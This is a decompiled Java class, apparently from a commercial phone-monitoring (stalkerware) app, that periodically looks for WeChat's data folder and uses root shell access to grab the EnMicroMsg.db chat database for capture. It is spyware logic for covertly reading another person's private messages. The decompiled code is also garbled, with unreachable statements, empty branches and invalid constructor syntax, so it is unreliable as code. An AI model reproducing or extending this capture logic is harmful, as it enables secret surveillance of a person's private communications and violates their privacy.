package com.vvt.capture.wechat.a;

import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.TimerTask;

class f extends TimerTask {
    private f(b paramb) {}

    public void run() {
        boolean bool1 = b.a();
        if (bool1) {}
        Object localObject1 = com.vvt.capture.wechat.b.a;
        Object localObject2 = new java.io.File(localObject1);
        bool1 = ((File)localObject2).exists();
        boolean bool2;
        if (bool1) {
            bool1 = b.a();
            if (bool1) {}
            localObject1 = com.vvt.capture.wechat.b.a();
            bool2 = com.vvt.ag.b.a((String)localObject1);
            if (bool2) {
                bool1 = b.a();
                if (!bool1) {}
            }
        }

        for (;;) {
            bool1 = b.a();
            if (bool1) {}
            return;
            bool2 = b.a();
            if (bool2) {}
            localObject2 = com.vvt.capture.wechat.b.a;
            localObject1 = p.a((String)localObject2, (String)localObject1);
            bool2 = ShellUtil.b((String)localObject1);
            if (bool2) {
                localObject1 = p.a((String)localObject1, "EnMicroMsg.db");
                localObject2 = new java/io/File;
                ((File)localObject2).<init>((String)localObject1);
                try {
                    boolean bool3 = b.a();
                    if (bool3) {}
                    bool2 = ((File)localObject2).exists();
                    if (!bool2) {
                        break label182;
                    }
                    bool2 = b.a();
                    if (bool2) {}
                    localObject2 = this.a;
                    b.a((b)localObject2, (String)localObject1);
                    localObject1 = this.a;
                    b.a((b)localObject1);
                } catch (Exception e) {
                    bool1 = b.c();
                }

                if (bool1) {
                    continue;
                    label182:
                    bool1 = b.a();
                    if (!bool1) {}
                }
            } else {
                bool1 = b.a();
                if (bool1) {
                    continue;
                    bool1 = b.a();
                    if (!bool1) {}
                }
            }
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */